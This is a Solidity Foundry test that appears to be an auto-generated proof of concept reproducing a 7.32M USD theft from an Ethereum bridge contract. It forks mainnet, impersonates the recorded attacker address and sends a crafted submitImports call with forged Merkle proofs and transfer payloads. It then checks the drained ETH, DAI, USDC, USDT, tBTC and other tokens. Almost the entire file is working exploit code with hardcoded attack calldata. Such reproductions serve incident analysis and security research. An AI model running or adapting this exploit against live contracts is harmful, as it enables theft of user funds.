// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 7.32M USD
// Attacker : 0xbda71b58cec0b1c20a8f87ccd52fa0679747855c
// Attack Contract : 0x71518580f36feceffe0721f06ba4703218cd7f63
// Vulnerable Contract : 0x71518580f36feceffe0721f06ba4703218cd7f63
// Attack Tx : 0xa1f1e65c1cea4dba4ae439cd4dcdba6cc2dbda0ed1228e61f29ae9c9324eb099
// Block : 25592836
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 7.54M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63;
    uint256 constant FORK_BLOCK = 25592835;
    uint256 constant TX_TIMESTAMP = 1784778359;
    uint256 constant TX_BLOCK_NUMBER = 25592836;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 2;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        _logBalances("Before exploit");
        attack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function attack() internal {
        Abi_submitImports_Param0_Field0_Field2[] memory submitImportsParam0Field0Field2 =
            new Abi_submitImports_Param0_Field0_Field2[](3);
        bytes32[] memory submitImportsParam0Field0Field2Row0Field1Field4 = new bytes32[](1);
        submitImportsParam0Field0Field2Row0Field1Field4[0] =
            bytes32(hex"11b6f366bf7702e7f43bc2bc3bbd90bba80dccc714b7d67035bd4be0aa8e6ef5");
        submitImportsParam0Field0Field2[0] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 2,
                height: 0,
                proofLength: 2,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field2Row0Field1Field4
            })
        });
        bytes32[] memory submitImportsParam0Field0Field2Row1Field1Field4 = new bytes32[](1);
        submitImportsParam0Field0Field2Row1Field1Field4[0] =
            bytes32(hex"680d07116f177d82bf3295a6658bb0eaa797d74a48784526486c2c3abf09a7eb");
        submitImportsParam0Field0Field2[1] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 2,
                height: 0,
                proofLength: 2,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field2Row1Field1Field4
            })
        });
        bytes32[] memory submitImportsParam0Field0Field2Row2Field1Field4 = new bytes32[](1);
        submitImportsParam0Field0Field2Row2Field1Field4[0] =
            bytes32(hex"8feb61fbc380c44c00166e666388a61424efa02a26702c5882812a089ec10b08");
        submitImportsParam0Field0Field2[2] = Abi_submitImports_Param0_Field0_Field2({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field2_Field1({
                version: 2,
                height: 0,
                proofLength: 2,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field2Row2Field1Field4
            })
        });
        Abi_submitImports_Param0_Field0_Field3[] memory submitImportsParam0Field0Field3 =
            new Abi_submitImports_Param0_Field0_Field3[](3);
        bytes memory submitImportsParam0Field0Field3Row0Field2TransferPayload =
            hex"90f07e7f8e59508b5f3cea9422cd7edc88f44ccbb42b2de3b85c0173cf435846010400000085202f8901000000010000000000000000000000";
        Abi_submitImports_Param0_Field0_Field3_Field3[] memory submitImportsParam0Field0Field3Row0Field3 =
            new Abi_submitImports_Param0_Field0_Field3_Field3[](1);
        bytes32[] memory submitImportsParam0Field0Field3Row0Field3Row0Field1Field4 = new bytes32[](3);
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[0] =
            bytes32(hex"75f5a00b1f2d9b0d898a4d81b00d417d0123684e05bb4af6813adfe08cce0aee");
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[1] =
            bytes32(hex"549cf8b8a9ba6be656c6af9b683156cacbc2807881c465e2bcea8eb24c663843");
        submitImportsParam0Field0Field3Row0Field3Row0Field1Field4[2] =
            bytes32(hex"0400000000000000000000000000000000000000000000000000000000000000");
        submitImportsParam0Field0Field3Row0Field3[0] = Abi_submitImports_Param0_Field0_Field3_Field3({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field3_Field3_Field1({
                version: 2,
                height: 0,
                proofLength: 4,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field3Row0Field3Row0Field1Field4
            })
        });
        submitImportsParam0Field0Field3[0] = Abi_submitImports_Param0_Field0_Field3({
            transferType: 1,
            flags: 0,
            transferPayload: submitImportsParam0Field0Field3Row0Field2TransferPayload,
            proofs: submitImportsParam0Field0Field3Row0Field3
        });
        bytes memory submitImportsParam0Field0Field3Row1Field2TransferPayload =
            hex"38595f768572f742e4df0957c9bd13844d69e1d8e10720aa63ae7623c556dd7b00000000ffffffff";
        Abi_submitImports_Param0_Field0_Field3_Field3[] memory submitImportsParam0Field0Field3Row1Field3 =
            new Abi_submitImports_Param0_Field0_Field3_Field3[](1);
        bytes32[] memory submitImportsParam0Field0Field3Row1Field3Row0Field1Field4 = new bytes32[](3);
        submitImportsParam0Field0Field3Row1Field3Row0Field1Field4[0] =
            bytes32(hex"9fd6da326da543231c5f12d7b51cff1d637f10b6554a9616709c9cfd6226c2e5");
        submitImportsParam0Field0Field3Row1Field3Row0Field1Field4[1] =
            bytes32(hex"549cf8b8a9ba6be656c6af9b683156cacbc2807881c465e2bcea8eb24c663843");
        submitImportsParam0Field0Field3Row1Field3Row0Field1Field4[2] =
            bytes32(hex"0400000000000000000000000000000000000000000000000000000000000000");
        submitImportsParam0Field0Field3Row1Field3[0] = Abi_submitImports_Param0_Field0_Field3_Field3({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field3_Field3_Field1({
                version: 2,
                height: 1,
                proofLength: 4,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field3Row1Field3Row0Field1Field4
            })
        });
        submitImportsParam0Field0Field3[1] = Abi_submitImports_Param0_Field0_Field3({
            transferType: 2,
            flags: 0,
            transferPayload: submitImportsParam0Field0Field3Row1Field2TransferPayload,
            proofs: submitImportsParam0Field0Field3Row1Field3
        });
        bytes memory submitImportsParam0Field0Field3Row2Field2TransferPayload =
            hex"00000000000000009b1a0403000101140000000000000000000000000000000000000000cc4c7c04030c010101004c73010080001af5b8015c64d39ab44c60ead8317f9f5a9b6c4c0695e4d2cf06d35133fdc31ecd1a0fca11643e2035782faecf2fa4e227d2d31c454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752000000000000000800000080fd874e80fd874e75";
        Abi_submitImports_Param0_Field0_Field3_Field3[] memory submitImportsParam0Field0Field3Row2Field3 =
            new Abi_submitImports_Param0_Field0_Field3_Field3[](1);
        bytes32[] memory submitImportsParam0Field0Field3Row2Field3Row0Field1Field4 = new bytes32[](3);
        submitImportsParam0Field0Field3Row2Field3Row0Field1Field4[0] =
            bytes32(hex"63d44a172e9999e5890bf6aa81f3bcdc4310f19d2eb6057899af7468d00e1fe9");
        submitImportsParam0Field0Field3Row2Field3Row0Field1Field4[1] =
            bytes32(hex"b1802122f235d3218bacf1824cc59b002a0795317c0303452c672eeb408d9c32");
        submitImportsParam0Field0Field3Row2Field3Row0Field1Field4[2] =
            bytes32(hex"0400000000000000000000000000000000000000000000000000000000000000");
        submitImportsParam0Field0Field3Row2Field3[0] = Abi_submitImports_Param0_Field0_Field3_Field3({
            proofType: 2,
            descriptor: Abi_submitImports_Param0_Field0_Field3_Field3_Field1({
                version: 2,
                height: 3,
                proofLength: 4,
                flags: 0,
                merkleBranch: submitImportsParam0Field0Field3Row2Field3Row0Field1Field4
            })
        });
        submitImportsParam0Field0Field3[2] = Abi_submitImports_Param0_Field0_Field3({
            transferType: 4,
            flags: 0,
            transferPayload: submitImportsParam0Field0Field3Row2Field2TransferPayload,
            proofs: submitImportsParam0Field0Field3Row2Field3
        });
        bytes memory submitImportsParam0Field1BridgeProof =
            hex"01454cb83913d688795e237837d30258d11ea7c75282a6dcfc833041454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c75201f87f6d4412dad7c4452e8293850df5327f02c30899d0ccb10e41454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752018b72f1c2d326d376add46698e385cf624f0ca1da8480a8b0ece76241454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c7520165b5aac6a4aa0eb656ab6b8812184e7545b6a2219590e8921041454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752011bd15cdbf0b5b8c9cc361ffbaf6d76cc2cdfd66782b1b8a59a960841454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752014558cef7fb1211e71ea8023ae17227b7b7f4a7fd80e2f09bca962a41454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752015e5c332015f474edb997880464dd55b7026b446ddacccbcfff4141454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c75201452f102516dd810b49b1b652e339c7563821415e818d83ee87d94d41454cb83913d688795e237837d30258d11ea7c752000914cfd0a20703cd11e0b9f665e1c3f1ef989c142d54454cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c752";
        (bool ok, bytes memory result) = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63.call{value: 0}(
            abi.encodeWithSignature(
                "submitImports(((uint8,uint8,(uint8,(uint8,uint32,uint32,uint8,bytes32[]))[],(uint8,uint8,bytes,(uint8,(uint8,uint32,uint32,uint8,bytes32[]))[])[]),bytes))",
                Abi_submitImports_Param0({
                    importBundle: Abi_submitImports_Param0_Field0({
                        version: 2,
                        network: 2,
                        proofRoots: submitImportsParam0Field0Field2,
                        transfers: submitImportsParam0Field0Field3
                    }),
                    bridgeProof: submitImportsParam0Field1BridgeProof
                })
            )
        );
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.ZERO, "ETH", 1137452815840000000000);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.scrvUSD, "scrvUSD", 92784360277250000000000);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.tBTC, "tBTC", 71504591500000000000);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.EURC, "EURC", 31475664323);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.DAI, "DAI", 220357027072980000000001);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.MKR, "MKR", 59429543840000000000);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.USDC, "USDC", 149275074098);
        _expectProfit(Addresses.A_CFD0A2_2D54, address(0), Addresses.USDT, "USDT", 78300537681);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant scrvUSD = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367; // Addresses.scrvUSD = 0x0655977feb2f289a4ab78af67bab0d17aab84367 label=Yearn V3 Vault token_symbol=scrvUSD roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant tBTC = 0x18084fbA666a33d37592fA2633fD49a74DD93a88; // Addresses.tBTC = 0x18084fba666a33d37592fa2633fd49a74dd93a88 label=TBTC token_symbol=tBTC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant EURC = 0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c; // Addresses.EURC = 0x1abaea1f7c830bd89acc67ec4af516284b1bc33c label=FiatTokenProxy token_symbol=EURC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // Addresses.DAI = 0x6b175474e89094c44da98b954eedeac495271d0f label=Dai token_symbol=DAI roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2; // Addresses.MKR = 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2 label=DSToken token_symbol=MKR roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0xBda71b58cEc0b1C20A8f87cCD52FA0679747855c; // Addresses.attacker_eoa = 0xbda71b58cec0b1c20a8f87ccd52fa0679747855c label=attacker_eoa roles=attacker_eoa|contract|observed_address|sender source=tx_metadata.from confidence=high
    address internal constant A_CFD0A2_2D54 = 0xCFd0A20703cD11E0b9f665e1C3F1Ef989C142D54; // Addresses.A_CFD0A2_2D54 = 0xcfd0a20703cd11e0b9f665e1c3f1ef989c142d54 label=0xcfd0a20703cd11e0b9f665e1c3f1ef989c142d54 roles=code_contract|contract|economic_holder|observed_address|profit_holder|recipient|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // Addresses.USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7 label=TetherToken token_symbol=USDT roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
}

struct Abi_submitImports_Param0_Field0_Field2_Field1 {
    uint8 version;
    uint32 height;
    uint32 proofLength;
    uint8 flags;
    bytes32[] merkleBranch;
}

struct Abi_submitImports_Param0_Field0_Field2 {
    uint8 proofType;
    Abi_submitImports_Param0_Field0_Field2_Field1 descriptor;
}

struct Abi_submitImports_Param0_Field0_Field3_Field3_Field1 {
    uint8 version;
    uint32 height;
    uint32 proofLength;
    uint8 flags;
    bytes32[] merkleBranch;
}

struct Abi_submitImports_Param0_Field0_Field3_Field3 {
    uint8 proofType;
    Abi_submitImports_Param0_Field0_Field3_Field3_Field1 descriptor;
}

struct Abi_submitImports_Param0_Field0_Field3 {
    uint8 transferType;
    uint8 flags;
    bytes transferPayload;
    Abi_submitImports_Param0_Field0_Field3_Field3[] proofs;
}

struct Abi_submitImports_Param0_Field0 {
    uint8 version;
    uint8 network;
    Abi_submitImports_Param0_Field0_Field2[] proofRoots;
    Abi_submitImports_Param0_Field0_Field3[] transfers;
}

struct Abi_submitImports_Param0 {
    Abi_submitImports_Param0_Field0 importBundle;
    bytes bridgeProof;
}

